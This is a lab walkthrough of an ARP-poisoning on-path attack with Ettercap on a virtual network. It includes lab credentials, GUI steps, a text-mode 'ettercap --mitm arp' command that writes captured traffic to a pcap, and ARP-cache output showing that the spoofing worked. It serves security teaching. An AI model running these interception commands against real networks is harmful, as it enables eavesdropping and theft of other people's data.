Once we have gained access to a client’s LAN, we often will use a tool like Ettercap to conduct an on-path attack.

On-path attacks are very powerful ways to steal data that is travelling on a network. Without end-to-end encryption, as with much data travelling on local LANs, it is easy to capture clear text information, and even complete files, using on-path attack methods.

**Note**: **On-path** is replacing man-in-the-middle (MITM) as the name of this type of attack.

Use the command **ip neighbor** to view the current ARP cache on the target computer.

**Login**

User: labuser
Pass: Cisco123

The user of the 10.6.6.23 host is communicating with the server at 10.6.6.13. The on-path attacker at 10.6.6.1 (your Kali VM).

```
labuser@gravemind:~$ ip neighbor
10.6.6.1 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
```

###  **Update arp cache by pinging targets**

```
ping -c 5 10.6.6.13
```

### Load Ettercap GUI interface to begin scanning.

Start Ettercap GTK+ graphical user interface using the **ettercap -G** command.

```
sudo ettercap -G
```

- The Ettercap GUI opens in a new window. You are sniffing traffic on an internal, virtual network. The default setup is to scan using interface eth0. Change the sniffing interface to **br-internal**, which is the interface that is configured on the 10.6.6.0/24 virtual network, by changing the value in the **Setup > Primary** **Interface** dropdown.
- Click the **checkbox** icon at the top right of the Ettercap screen to continue. A message appears at the bottom of the screen indicating that Unified sniffing has started.
- In the Ettercap GUI window, open the Hosts List window by clicking the Ettercap menu (three dots icon). Select the **Hosts** entry and then **Hosts List**. Click the **Scan for Hosts** icon (magnifying glass) at top left in the menu bar. A list of the hosts that were discovered on the 10.6.6.0/24 network appears in the Host List window.

1. Define the source and destination devices for the attack. To do so, click the IP address **10.6.6.23** in the window to highlight the target user host. Click the **Add to Target 1** button at the bottom of the Host List window. This defines the user’s host as Target 1.
2. Click the IP address of the destination web server at **10.6.6.13** to highlight the line. Click the **Add to Target 2** button at the bottom of the host window.

Any IP/MAC address specified as a Target 1 will have all its traffic diverted through the attacking computer that is running Ettercap. In this lab, the attacking computer is the Kali Linux machine at 10.6.6.1. All other computers on the subnet, other than the targets, will communicate normally.

3. Click the MITM icon on the menu bar (the first circular icon on top right). Select **ARP Poisoning…** from the dropdown menu. Verify that **Sniff remote connections** is selected. Click **OK**.
4. The MITM exploit is started. If sniffing does not start immediately, click the **Start** option (play button) at left in the top menu.

**Verify it's working from the target**

```
ping -c 5 10.6.6.13
```

```
labuser@gravemind:~$ ip neighbor
10.6.6.1 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
10.6.6.13 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
```

In this step, you will use the command line interface in Ettercap to perform ARP spoofing and write a .pcap file that can be opened in Wireshark.

The **ettercap -T** command runs Ettercap in text mode, instead of using the GUI interface, **-q** to run in quiet mode, **-i**  to specify the interface, and **mitm arp** to specify mode. The syntax to start Ettercap and specify the targets is:

```
sudo ettercap -T [options] -q -i [interface] --write [file name] -- mitm arp /[target 1]// /[target 2]//
```

```
sudo ettercap -T -q -i br-internal --write mitm-saved.pcap --mitm arp /10.6.6.23// /10.6.6.13//
```

Example:

```
labuser@gravemind:~$ ip neighbor
10.6.6.1 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
10.6.6.13 dev eth0 lladdr 02:42:0a:06:06:0d STALE
10.6.6.11 dev eth0 lladdr 02:42:0a:06:06:0b STALE
labuser@gravemind:~$ ip address 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
27: eth0@if28: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:06:06:17 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.6.6.23/24 brd 10.6.6.255 scope global eth0
       valid_lft forever preferred_lft forever
labuser@gravemind:~$ ip neighbor
10.6.6.1 dev eth0 lladdr 02:42:08:8e:f9:14 DELAY
10.6.6.13 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
10.6.6.11 dev eth0 lladdr 02:42:0a:06:06:0b STALE
labuser@gravemind:~$ ping -c 5 10.6.6.11
PING 10.6.6.11 (10.6.6.11) 56(84) bytes of data.
64 bytes from 10.6.6.11: icmp_seq=1 ttl=64 time=0.059 ms
64 bytes from 10.6.6.11: icmp_seq=2 ttl=64 time=0.074 ms
64 bytes from 10.6.6.11: icmp_seq=3 ttl=64 time=0.064 ms
64 bytes from 10.6.6.11: icmp_seq=4 ttl=64 time=0.048 ms
64 bytes from 10.6.6.11: icmp_seq=5 ttl=64 time=0.055 ms

--- 10.6.6.11 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 105ms
rtt min/avg/max/mdev = 0.048/0.060/0.074/0.008 ms
labuser@gravemind:~$ ping -c 5 10.6.6.13
PING 10.6.6.13 (10.6.6.13) 56(84) bytes of data.
64 bytes from 10.6.6.13: icmp_seq=1 ttl=64 time=9.04 ms
64 bytes from 10.6.6.13: icmp_seq=2 ttl=64 time=12.3 ms
64 bytes from 10.6.6.13: icmp_seq=3 ttl=64 time=10.5 ms
64 bytes from 10.6.6.13: icmp_seq=4 ttl=64 time=9.57 ms
64 bytes from 10.6.6.13: icmp_seq=5 ttl=64 time=16.4 ms

--- 10.6.6.13 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 9ms
rtt min/avg/max/mdev = 9.042/11.572/16.428/2.669 ms
labuser@gravemind:~$ ip neighbor
10.6.6.1 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
10.6.6.13 dev eth0 lladdr 02:42:08:8e:f9:14 REACHABLE
10.6.6.11 dev eth0 lladdr 02:42:0a:06:06:0b REACHABLE
```

10.6.6.13 now has the same MAC as 10.6.6.1. The MAC for 10.6.6.11 is unchanged because it is not a target in the attack.

We can now review the mitm-saved.pcap file in wireshark.

The MAC address for 10.6.6.23 can be found in the output of the Ettercap text interface in Target Group 1.

The 10.6.6.23 (target user) and 10.6.6.1 (attacker) have the same MAC address. The MAC address for 10.6.6.11 (bystander) remains the same because it is not the target in the attack.

**ARP protocol uses Layer 2 broadcasts to obtain the destination MAC associated with the target IP address. Broadcasts and Layer 2 ARP information are not forwarded beyond the local network.**

